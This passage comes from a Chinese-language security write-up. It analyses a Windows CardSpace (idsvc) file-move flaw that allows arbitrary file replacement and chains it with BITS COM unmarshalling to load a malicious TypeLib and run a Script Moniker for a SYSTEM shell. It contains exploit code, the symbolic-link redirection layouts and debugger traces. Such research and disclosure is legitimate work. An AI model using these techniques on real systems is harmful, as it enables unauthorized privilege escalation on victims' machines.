    ...      
      protected void AtomicFileCopy(string source, string destination)
        {
          if (!File.Exists(source))
            return;
            //加上.atomic后缀,移动文件
          File.Copy(source, source + ".atomic", true);
          FileInfo fileInfo = new FileInfo(source + ".atomic");
          if (fileInfo.Length == 0L)
            return;
          fileInfo.MoveTo(destination);
        }
idsvc服务通过new
SystemIdentity(true)切换回idsvc服务身份,调用AtomicFileCopy移动用户配置文件.在默认配置下%APPDATA%目录下的文件在可由当前用户可完全控制.当高权限进程对低权限进程可控制文件进行删除,移动,复制,设置属性等操作时,低权限进程均可利用此特权做一些其他操作.James
Forshaw@tiraniddo为我们提供了一套[开源工具](https://github.com/googleprojectzero/symboliclink-testing-tools),他在NTFS文件系统和Windows内部的开创性工作完成了所有繁重工作,实现了几种滥用Windows文件系统和路径解析功能的技术和利用方法.NTFS文件系统允许将一个用户控制目录挂载到另一个用户控制目录(挂载点Volume
Mount Points和交叉点Junction Points),也允许通过符号链接Symbolic Links(NTFS重解析点Reparse
Points)将一个目标链接至另一个,和硬链接(Hard
Link)将一个用户可控制文件链接至另一个可读文件,以上方式均可导致恶意攻击者滥用高特权进程执行文件操作.对于poc中的利用,可使用如下两种方式对源文件和目标文件创建相应符号链接,第一种方式为挂载点和硬链接,这种方式只适用于win7,硬链接已被微软缓解,具体原因见[分析](http://whereisk0shl.top.park.bitcron.com/post/2019-06-08),第二种方式仍然可在win10实现利用,原理是通过任意用户可写对象目录RPC
Control链接至指定目录,然后继续链接RPC
Control目录下文件至指定文件,具体方式如下,关于符号链接的相关可以参考[上篇](https://www.4hou.com/posts/qV8D)和[下篇](https://www.4hou.com/posts/rE7B),这里不再赘述
    第一种方式, 挂载点和硬链接
    C:\workspace\mountpoint ->  C:\Users\Username\AppData\Local\Microsoft\CardSpace
    源文件(挂载点) = C:\workspace\mountpoint\CardSpace.db(Fake.dll) -> C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db
    目标文件(硬链接) =C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic ->  C:\Evil.dll
    第二种方式,符号链接至 \RPC Control
    C:\Users\Username\AppData\Local\Microsoft\CardSpace -> \RPC Control
    源文件 = C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db ->\RPC Control\CardSpace.db
    目标文件 =C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic -> \RPC Control\CardSpace.db.atomic
    源文件 = \RPC Control\CardSpace.db ->C:\Fake.dll 
    目标文件 = \RPC Control\CardSpace.db.atomic -> C:\Evil.dll
从Process
Monitor看出idsvc服务移动文件时并没使用模拟(Impersonate)用户身份操作,也没有判断文件的符号链接属性,就导致任意文件替换权限提升漏洞,以下是漏洞利用关键代码
    BOOL Exploit()
    {
    	RpcRequest* req = (RpcRequest*)CoTaskMemAlloc(sizeof(RpcRequest));
    	req->Type = L"ManageRequest";
    	req->Length = 0;
    	req->Data = 0;
    	RpcResponse* rep = (RpcResponse*)CoTaskMemAlloc(sizeof(RpcResponse));
    	UINT32* ctx = 0;
    	long ret = Proc0_RPCClientBindToService(hBinding, (void**)&ctx);
    	printf("Proc0_RPCClientBindToService :%d\n", ret);
    	ret = Proc2_RPCDispatchClientUIRequest((void**)&ctx, req, &rep);
    	printf("Proc2_RPCDispatchClientUIRequest :%08x\n", ret);
    	return 0;
    }
###  漏洞利用分析
笔者设计了一种新的基于任意文件替换的提权利用方式,原型来自[CVE-2017-0213](https://www.exploit-db.com/exploits/42020/),这种方式适用于Windows7至Windows10所有版本操作系统,但前提是要被替换的文件不是TrustedInstaller控制权限,才可以触发漏洞,原因是TrustedInstaller权限高于其他权限,如果直接执行替换操作,即使是以System权限操作结果都是拒绝访问,一般只有管理员权限或者System权限的文件才符合条件.笔者制作了一个工具用于搜索指定目录下可替换文件,在相关项目列表中提供,也可以使用微软[SysinternalsSuite](https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite)中的accesschk工具,启动命令行如下,最后一个参数为指定目录文件
    //[SysinternalsSuite]工具模式,最后一个参数为指定目录文件
    accesschk.exe -s -w  "nt authority\system"  c:\windows\system32\*.dll
    //笔者工具中的查找模式,参数为目标路径和后缀名
    MyComEop.exe  v [find path] [extension]
    //深度查找模式,参数为目标路径和后缀名
    MyComEop.exe  d [find path] [extension]	
对于Windows7系统笔者使用以上工具找到了一些系统自带的TypeLib(类型库)文件可以实现利用,对于Windows10等高版本系统却没有发现,但是对于安装了第三方软件注册的Com组件的一般都存在类似TypeLib文件符合条件,所以仍然具有利用价值.找到TypeLib后用[Windows
SDK](https://developer.microsoft.com/zh-cn/windows/downloads/windows-10-sdk/)中的OleView工具打开,选择任意一个Interface分别提取出这3个参数IID_Interface,InterfaceName,TypeLib_GUID就可以使用利用工具中的高级模式实现利用,这里笔者使用的是这个Windows7系统一个自带的TypeLib进行演示.
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.EnterpriseServices.tlb
漏洞利用的原理来自Background Intelligent Transfer
Service服务(简称bits),调用bits服务的公开api中的IBackgroundCopyJob->SetNotifyInterface接口允许传递任意远程com对象,如果这个对象继承了IMarshal接口,bits服务会根据接口方法GetUnmarshalClass中传入的CLSID自定义Unmarshal反序列化.这里笔者使用的标准Unmarshal方式即CStdMarshal::UnmarshalInterface触发反序列化,而导致反序列化的数据来自MarshalStream中的OBJREF结构,这个结构格式如下,具体可参考[微软官方文档](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31?redirectedfrom=MSDN)和我的[另一篇文章](https://bbs.pediy.com/thread-228829.htm)
    typedef LUID OXID;
    typedef LUID OID;
    typedef GUID IPID;
    typedef struct tagDUALSTRINGARRAY    {
        unsigned short wNumEntries;     // Number of entries in array.
        unsigned short wSecurityOffset; // Offset of security info.
        unsigned short aStringArray[];
    } DUALSTRINGARRAY;
    typedef struct tagSTDOBJREF    {
        DWORD   flags;
        DWORD   cPublicRefs;    
       //对象所处的套间的标识符,在套间建立时会为套间建立一个OXID,叫做对象引出标识符
        OXID           oxid;
      //存根管理器的标识符  
        OID            oid; 
    //接口存根标识符,用来唯一的标识套间中的一个接口指针,这跟接口的IID是不同的,IID是用来标识   
        IPID           ipid;
    } STDOBJREF;
    typedef struct tagOBJREF    {
        unsigned long signature;//MEOW
        unsigned long flags;
        GUID          iid;
        union        {
            struct            {
                STDOBJREF       std;
                DUALSTRINGARRAY saResAddr;
            } u_standard;
            struct            {
                STDOBJREF       std;
                CLSID           clsid;
                DUALSTRINGARRAY saResAddr;
            } u_handler;
            struct            {
                CLSID           clsid;
                unsigned long   cbExtension;
                unsigned long   size;
                ULONGLONG pData;
            } u_custom;
        } u_objref;
    } OBJREF;
这里flags为OBJREF_STANDARD(0x01),表示使用标准Unmarshal方式(CStdMarshal),对应的下方联合体的是STDOBJREF,至于其他flags类型均有自定义的unmarshal方式,不在本文的讨论范围,请读者自行研究.而最终导致实现漏洞利用的是其中的iid字段,通过逆向研究发现替换这个iid(也就是oleview中找到的接口IID_Interface)就可以触发bits服务加载这个iid对应com组件对象的TypeLib(类型库),也就是说任意TypeLib反序列化.最终替换TypeLib文件构造为嵌套的TypeLib结构就可以运行Script
Moniker来GetShell.这里附上漏洞利用关键代码:
    virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
            /* [annotation][unique][in] */
            _In_  IStream *pStm,
            /* [annotation][in] */
            _In_  REFIID riid,
            /* [annotation][unique][in] */
            _In_opt_  void *pv,
            /* [annotation][in] */
            _In_  DWORD dwDestContext,
            /* [annotation][unique][in] */
            _Reserved_  void *pvDestContext,
            /* [annotation][in] */
            _In_  DWORD mshlflags)
        {
            IStorage* stg;
            ILockBytes* lb;
            CreateILockBytesOnHGlobal(nullptr, TRUE, &lb);
            StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
            ULONG cbRead;
            ULONG cbWrite;
            IStreamPtr pStream = nullptr;
            HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &pStream);
            LARGE_INTEGER dlibMove = { 0 };
            ULARGE_INTEGER plibNewPosition;
            hr = CoMarshalInterface(pStream, IID_IUnknown, static_cast(stg), dwDestContext, pvDestContext, mshlflags);
            OBJREF* headerObjRef = (OBJREF*)malloc(1000);
            hr = pStream->Seek(dlibMove, STREAM_SEEK_SET, &plibNewPosition);
            hr = pStream->Read(headerObjRef, 1000, &cbRead);
            printf("[+]MarshalInterface: %ls %pn", IIDToBSTR(IID_InterfaceFake).GetBSTR(), this);
            //IID_InterfaceFake就是找到的接口IID_Interface
            headerObjRef->iid = IID_InterfaceFake;
            hr = pStm->Write(headerObjRef, cbRead, &cbWrite);
            return hr;
        }
从调试结果可以看到CStdMarshal::UnmarshalInterface最终调用了LoadTypeLibEx,传入iid是IID_InterfaceFake(来自OBJREF),第二次调用LoadTypeLibEx加载了Script
Moniker.证明确实可以HOOK高权限进程反序列化加载任意TypeLib
    1: kd> bp OLEAUT32!GetTypeInfoOfIID
    Breakpoint 0 hit
    OLEAUT32!GetTypeInfoOfIID:
    0033:000007fe`febf0140 4533c0          xor     r8d,r8d
    //继续调试....
    0: kd> p
    OLEAUT32!GetTypeInfoOfIIDFwd+0x19:
    0033:000007fe`febefd09 4889842480030000 mov     qword ptr [rsp+380h],rax
    0: kd> r
    rax=0000113b9b912356 rbx=0000000000000000 rcx=00000000059f912c
    rdx=00000000033ae060 rsi=00000000059f9150 rdi=00000000059f9148
    rip=000007fefebefd09 rsp=00000000033adc80 rbp=0000000000000002
     r8=0000000000000000  r9=0000000000000000 r10=0000000000000000